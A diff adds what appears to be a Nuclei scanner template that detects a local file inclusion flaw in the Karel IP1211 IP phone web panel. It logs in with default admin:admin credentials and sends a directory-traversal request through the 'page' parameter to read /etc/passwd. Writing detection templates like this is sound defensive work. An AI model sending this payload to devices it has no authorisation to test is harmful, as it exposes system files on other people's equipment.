@@ -1,0 +1,32 @@
+http:
+- headers:
+    Authorization: Basic YWRtaW46YWRtaW4=
+  matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd'
+id: karel-ip-phone-lfi
+info:
+  author: 0x_Akoko
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Karel IP Phone IP1211 Web Management Panel is vulnerable to local file
+    inclusion and can allow remote attackers to access arbitrary files stored on the
+    remote device via the 'cgiServer.exx' endpoint and the 'page' parameter.
+  metadata:
+    max-request: 1
+  name: Karel IP Phone IP1211 Web Management Panel - Local File Inclusion
+  reference:
+  - https://cxsecurity.com/issue/WLB-2020100038
+  - https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon
+  severity: high
+  tags: karel,lfi
